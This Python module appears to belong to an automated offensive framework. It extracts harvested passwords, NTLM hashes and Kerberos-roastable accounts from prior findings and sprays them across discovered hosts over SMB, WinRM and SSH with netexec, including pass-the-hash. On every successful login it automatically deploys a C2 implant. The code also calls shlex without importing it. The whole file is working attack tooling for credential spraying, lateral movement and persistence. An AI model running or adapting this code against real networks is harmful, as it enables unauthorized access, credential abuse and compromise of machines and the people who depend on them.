import asyncio, logging, re, uuid
from typing import Optional

from orchestrator.brain.phases.models import Finding, Severity
from orchestrator.kali_tools_client import kali
from orchestrator.c2.manager import get_c2

logger = logging.getLogger("credential_spray")


def _extract_creds(findings: list[Finding]) -> list[dict]:
    seen = set()
    creds = []
    for f in findings:
        raw = f.evidence
        payload = f.payload or ""
        combined = f"{raw} {payload}"

        if f.type in ("credential", "password"):
            for line in combined.split("\n"):
                m = re.search(r'([\w.-]+[\\/])?(\w+)[:=]\s*(\S+)', line)
                if m:
                    user = m.group(2)
                    pwd = m.group(3)
                    key = f"{user}:{pwd}"
                    if key not in seen:
                        seen.add(key)
                        creds.append({"user": user, "password": pwd, "source": f.host or f.target})
                if ":" in line.strip() and not line.strip().startswith("#"):
                    parts = line.strip().split(":", 1)
                    if len(parts) == 2 and parts[0] and parts[1]:
                        key = f"{parts[0]}:{parts[1]}"
                        if key not in seen:
                            seen.add(key)
                            creds.append({"user": parts[0], "password": parts[1], "source": f.host or f.target})

        if f.type in ("hash", "hashdump", "ntlm_hash"):
            for line in combined.split("\n"):
                parts = line.strip().split(":")
                if len(parts) >= 4:
                    user = parts[0]
                    nt_hash = parts[3] if len(parts) > 3 else parts[-1]
                    if nt_hash and nt_hash != "31d6cfe0d16ae931b73c59d7e0c089c0":
                        key = f"hash:{user}:{nt_hash}"
                        if key not in seen:
                            seen.add(key)
                            creds.append({"user": user, "hash": nt_hash, "source": f.host or f.target})

        if f.type == "kerberoastable_user" or f.type == "asrep_roastable":
            user = combined.strip().split(" ")[0] if combined.strip() else ""
            if user and user not in seen:
                seen.add(f"roast:{user}")
                creds.append({"user": user, "source": f.host or f.target, "roastable": True})

    return creds


def _extract_targets(findings: list[Finding]) -> list[str]:
    seen = set()
    hosts = []
    for f in findings:
        if f.host and f.host != f.target and f.host not in seen:
            seen.add(f.host)
            hosts.append(f.host)
        if f.type == "open_port" and f.host and f.host not in seen:
            seen.add(f.host)
            hosts.append(f.host)
        if f.type == "dns_resolution" and f.host and f.host not in seen:
            seen.add(f.host)
            hosts.append(f.host)
    return hosts


_progress = {}


def spray_progress() -> dict:
    return dict(_progress)


async def spray(creds: list[dict], targets: list[str],
                primary_target: str = "",
                findings: list = None) -> list[Finding]:
    spray_findings = []
    c2 = get_c2()

    if not creds:
        logger.info("  [spray] no credentials to spray")
        return spray_findings

    all_targets = list(set([primary_target] + targets)) if primary_target else targets
    if not all_targets:
        logger.info("  [spray] no targets to spray against")
        return spray_findings

    logger.info(f"  [spray] {len(creds)} creds × {len(all_targets)} targets = {len(creds)*len(all_targets)} attempts")

    spray_order = ["smb", "winrm", "ssh"]
    session_id_map = {}
    attempt_count = 0

    for cred in creds:
        for host in all_targets:
            for protocol in spray_order:
                attempt_count += 1
                key = f"{host}:{protocol}:{cred.get('user')}"
                _progress[key] = "trying"

                try:
                    if protocol == "smb":
                        if cred.get("hash"):
                            result = await kali.run("netexec",
                                f"smb {shlex.quote(host)} -u {shlex.quote(cred['user'])} -H {shlex.quote(cred['hash'])} --shares", timeout=60)
                        else:
                            result = await kali.run("netexec",
                                f"smb {shlex.quote(host)} -u {shlex.quote(cred['user'])} -p {shlex.quote(cred['password'])} --shares", timeout=60)
                        valid = (result.get("returncode") == 0 and
                                 "[+]" in (result.get("stdout", "") or result.get("output", "")))

                    elif protocol == "winrm":
                        if cred.get("hash"):
                            result = await kali.run("netexec",
                                f"winrm {shlex.quote(host)} -u {shlex.quote(cred['user'])} -H {shlex.quote(cred['hash'])}", timeout=60)
                        else:
                            result = await kali.run("netexec",
                                f"winrm {shlex.quote(host)} -u {shlex.quote(cred['user'])} -p {shlex.quote(cred['password'])}", timeout=60)
                        valid = (result.get("returncode") == 0 and
                                 "[+]" in (result.get("stdout", "") or result.get("output", "")))

                    elif protocol == "ssh":
                        if cred.get("password"):
                            result = await kali.run("netexec",
                                f"ssh {shlex.quote(host)} -u {shlex.quote(cred['user'])} -p {shlex.quote(cred['password'])}", timeout=60)
                            valid = (result.get("returncode") == 0 and
                                     "[+]" in (result.get("stdout", "") or result.get("output", "")))
                        else:
                            valid = False

                    if valid:
                        sid = uuid.uuid4().hex[:8]
                        session_id_map[key] = sid
                        _progress[key] = "valid"
                        logger.info(f"  [spray] ✓ {protocol.upper()} {host} as {cred['user']}")

                        spray_findings.append(Finding(
                            phase="credential", type=f"spray_{protocol}_success",
                            target=primary_target or host, host=host,
                            severity=Severity.CRITICAL,
                            description=f"{protocol.upper()} access on {host} as {cred['user']}",
                            evidence=f"session: {sid} | cred: {cred.get('user')}:{cred.get('password','<hash>')[:8]}***",
                        ))

                        if c2.backend_available:
                            deploy_user = cred.get("user", "Administrator")
                            deploy_pass = cred.get("password") or cred.get("hash", "")
                            if protocol in ("smb", "winrm"):
                                path = await c2.deploy_implant_winrm(
                                    host, deploy_user, deploy_pass)
                            else:
                                path = await c2.deploy_implant_ssh(
                                    host, deploy_user, deploy_pass)
                            if path:
                                spray_findings.append(Finding(
                                    phase="credential", type="implant_deployed",
                                    target=primary_target or host, host=host,
                                    severity=Severity.CRITICAL,
                                    description=f"Implant deployed on {host} via {protocol}",
                                    evidence=f"path: {path} | session: {sid}",
                                ))
                                logger.info(f"  [spray] ✓ implant deployed on {host} via {protocol}")
                        break

                    else:
                        _progress[key] = "failed"

                except Exception as e:
                    _progress[key] = f"error: {e}"
                    logger.debug(f"  [spray] {protocol} {host}@{cred.get('user')} error: {e}")

            else:
                continue
            break

    logger.info(f"  [spray] {attempt_count} attempts, {len(spray_findings)//2} valid sessions")
    return spray_findings
